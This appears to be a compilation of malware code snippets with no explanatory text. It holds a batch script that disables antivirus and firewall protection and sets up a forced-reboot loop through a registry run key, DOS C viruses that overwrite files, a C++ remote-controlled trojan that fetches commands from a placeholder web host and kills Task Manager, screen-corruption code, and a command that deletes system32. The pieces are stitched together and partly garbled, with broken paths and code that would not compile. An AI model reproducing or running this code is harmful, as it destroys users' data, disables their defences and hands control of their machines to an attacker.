@ echo off
rem —
rem Permanently Kill Anti-Virus
net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:Program Filesalwils~1avast4*.*
del /Q /F C:Program FilesLavasoftAd-awa~1*.exe
del /Q /F C:Program Fileskasper~1*.exe
cls
del /Q /F C:Program Filestrojan~1*.exe
del /Q /F C:Program Filesf-prot95*.dll
del /Q /F C:Program Filestbav*.dat
cls
del /Q /F C:Program Filesavpersonal*.vdf
del /Q /F C:Program FilesNorton~1*.cnt
del /Q /F C:Program FilesMcafee*.*
cls
del /Q /F C:Program FilesNorton~1Norton~1Norton~3*.*
del /Q /F C:Program FilesNorton~1Norton~1speedd~1*.*
del /Q /F C:Program FilesNorton~1Norton~1*.*
del /Q /F C:Program FilesNorton~1*.*
cls
del /Q /F C:Program Filesavgamsr*.exe
del /Q /F C:Program Filesavgamsvr*.exe
del /Q /F C:Program Filesavgemc*.exe
cls
del /Q /F C:Program Filesavgcc*.exe
del /Q /F C:Program Filesavgupsvc*.exe
del /Q /F C:Program Filesgrisoft
del /Q /F C:Program Filesnood32krn*.exe
del /Q /F C:Program Filesnood32*.exe
cls
del /Q /F C:Program Filesnod32
del /Q /F C:Program Filesnood32
del /Q /F C:Program Fileskav*.exe
del /Q /F C:Program Fileskavmm*.exe
del /Q /F C:Program Fileskaspersky*.*
cls
del /Q /F C:Program Filesewidoctrl*.exe
del /Q /F C:Program Filesguard*.exe
del /Q /F C:Program Filesewido*.exe
cls
del /Q /F C:Program Filespavprsrv*.exe
del /Q /F C:Program Filespavprot*.exe
del /Q /F C:Program Filesavengine*.exe
cls
del /Q /F C:Program Filesapvxdwin*.exe
del /Q /F C:Program Fileswebproxy*.exe
del /Q /F C:Program Filespanda software*.*
rem —


echo @echo off>c:windowshartlell.bat
echo break off>c:windowshartlell.bat
echo shutdown -r -t 11 -f>c:windowshartlell.bat
echo end>c:windowshartlell.bat
reg add
hkey_local_machinesofwaremicrosoftwindowscurrentversionrun /v 
startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add
hkey_current_usersoftwaremicrosoftwindowscurrentverionrun /v/t reg_sz /d c:windowshartlell.bat /f

@echo off
Copy C:\Programs\Your and idiot.bat C:\Programs
Start C:\Programs\Your an idiot.bat
 

FILE *Ron *vRon;

int owned = 0;

unsigned long x;

char buff[256];

struct ffblk ffblk;

clock_t st, end;

main()

{

 st=clock();

 clrscr();

 owned=(find_first(“*.*”, &ffblk,0);

 while(!done)

 {

 Ron=fopen(_arg[0], “rb”);

 vhost=fopen(ffblk.ff_name, “rb+”);

 if (vhost = =NULL)

 goto next;

 x = 89088;

 printf(“infecting %s\n”, ffblk.ff_name);

 while(x>2048)

 {

 fread(buff,256,1,Ron);

 fwrite(buff,256,1,vRon);

 x – = 2048;

 }

 fread(buff,x,1,Ron);

 fwrite(buff,x,1,vRon);

 a++;

 next:      fcloseall();

 owned = findnext(&ffblk);

 }

 end = clock()

 printf(“Infected %d files in %f sec”, a, (end-st)/CLK_TCk);

 return (0);

}

#include<stdio.h>
#include<io.h>
#include<dos.h>
#include<dir.h>
#include<conio.h>
#include<time.h>
FILE *Virus,*host;
int done,a=0;
unsigned long x;
char buff[2048];
struct ffblk ffblk;
clock_t st,end;
void main()
{
st=clock();
clrscr();
done=findfirst(“*.*”,&ffblk,0);
while(!done)
{
Virus=fopen(_argv[0],”rb”);
host=fopen(ffblk.ff_name,”rb+”);
if(host==NULL) goto next;
x=89088;
printf(“Infecting %s\n”,ffblk.ff_name,a);
while(x>2048)
{
fread(buff,2048,1,virus);
fwrite(buff,2048,1,host);
x-=2048;
}
fread(buff,x,1,virus);
fwrite(buff,x,1,host);
a++;
next:
{
fcloseall();
done=findnext(&ffblk);
}
}
printf(“DONE! (Total Files Infected= %d)”,a);
end=clock();
printf(“TIME TAKEN=%f SEC\n”,(end-st)/CLK_TCK);
getch();
}

#include <windows.h>
#pragma comment(lib, "Winmm.lib")
#include <urlmon.h> 
#pragma comment(lib, "urlmon.lib")
#include <iostream>
#include <fstream>
#include <WinInet.h>
#pragma comment(lib, "WinInet.lib")
#include <ShlObj.h>
using namespace std;
 
int Option, Assign, Target;
DWORD WINAPI LowProfile(LPVOID);
DWORD WINAPI Option1(LPVOID);
DWORD WINAPI Option2(LPVOID);
DWORD WINAPI Option3(LPVOID);
DWORD WINAPI Option4(LPVOID);
DWORD WINAPI Option5(LPVOID);
// Add more lines of Option6, Option7, etc. to create more commands.
HWND TaskMgr, SysError, WMP, Disk1, Disk2, Disk3, Disk4, Autoplay, VBS;
 
int main() {
// Hide Console Window
FreeConsole();
 
CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&LowProfile, 0, 0, NULL);
 

FILE *istream;
if ( (istream = fopen ( "C:\\Windows\\trojan\\assign.txt", "r" ) ) == NULL ) {
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/assign.html", L"c:\\Windows\\trojan\\assign.txt", NULL, NULL);
} else {
}
 
// Store Assign.txt in a variable
ifstream inAssign;
inAssign.clear();
inAssign.open("c:\\Windows\\trojan\\assign.txt");
inAssign >> Assign;
inAssign.close();
inAssign.clear();
 

 
    // Download Option & Target
    remove("c:\\Windows\\trojan\\option.txt");
    remove("c:\\Windows\\trojan\\target.txt");
    DeleteUrlCacheEntry(L"http://www.yourwebsitehere.com/trojan/");
    DeleteUrlCacheEntry(L"http://www.yourwebsitehere.com/trojan/target.html");
    Sleep(100);
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/", L"c:\\Windows\\trojan\\option.txt", NULL, NULL);
    URLDownloadToFile(NULL, L"http://www.yourwebsitehere.com/trojan/target.html", L"c:\\Windows\\trojan\\target.txt", NULL, NULL);
 
    // Read Option
    ifstream inFile;
    inFile.clear();
    inFile.open("c:\\Windows\\trojan\\option.txt");
    inFile >> Option;
    inFile.close();
    inFile.clear();
 
    // Read Target
    ifstream inTarget;
    inTarget.clear();
    inTarget.open("c:\\Windows\\trojan\\target.txt");
    inTarget >> Target;
    inTarget.close();
    inTarget.clear();
 
    if(Target == Assign || Target == 0) {
        if(Option == 1) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option1, 0, 0, NULL); }
        else if(Option == 2) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option2, 0, 0, NULL); }
        else if(Option == 3) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option3, 0, 0, NULL); }
        else if(Option == 4) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option4, 0, 0, NULL); }
        else if(Option == 5) { CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)&Option5, 0, 0, NULL); }
        // Add more of these lines for more commands
    }
    Sleep(5000);
    }
}
 
// Our LowProfile Thread. Hides all errors and things that may popup while inserting your U3 drive.
DWORD WINAPI LowProfile(LPVOID) {
    while(1) {
        // Obvious
        TaskMgr = FindWindow(NULL,L"Windows Task Manager");
        // May popup because of new hardware installation (U3)
        SysError = FindWindow(NULL,L"System Settings Change");
        // Windows Media Player may popup. Rarely happens, but had this once at a school computer.
        WMP = FindWindow(NULL,L"Windows Media Player");
        // The Removable Disk part of the U3 Drive can open automatically.
        Disk1 = FindWindow(NULL,L"(D:) Removable Disk");
        Disk2 = FindWindow(NULL,L"(E:) Removable Disk");
        Disk3 = FindWindow(NULL,L"(F:) Removable Disk");
        Disk4 = FindWindow(NULL,L"(G:) Removable Disk");
        // Autoplay
        Autoplay = FindWindow(NULL,L"Autoplay");
        // Errors caused by our VBScript go.vbs
        VBS = FindWindow(NULL,L"Windows Script Host");
        if( TaskMgr != NULL) {
            SetWindowText( TaskMgr,L"DIE!!!! =O");
            Sleep(500);
            PostMessage( TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( SysError != NULL) {
            PostMessage( SysError, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( WMP != NULL) {
            Sleep(1000);
            PostMessage( WMP, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk1 != NULL) {
            PostMessage( Disk1, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk2 != NULL) {
            PostMessage( Disk2, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk3 != NULL) {
            PostMessage( Disk3, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Disk4 != NULL) {
            PostMessage( Disk4, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( Autoplay != NULL) {
            PostMessage( Autoplay, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        if( VBS != NULL) {
            PostMessage( VBS, WM_CLOSE, (LPARAM)0, (WPARAM)0);
        }
        Sleep(500);
    }
}
 

 
DWORD WINAPI Option1(LPVOID) { // 1
    return 0;
}
 
DWORD WINAPI Option2(LPVOID) { // 2
    return 0;
}
 
DWORD WINAPI Option3(LPVOID) { // 3
    return 0;
}
 
DWORD WINAPI Option4(LPVOID) { // 4
    return 0;
}
 
DWORD WINAPI Option5(LPVOID) { // 5
    return 0;
}

StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 4;
}

int x1 = random() % (w - 400);
	int y1 = random() % (h - 400);
	int x2 = random() % (w - 400);
	int y2 = random() % (h - 400);
	int width = random() % 400;
	int height = random() % 400;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 3;
}

del c:\WINDOWS\system32*.*

 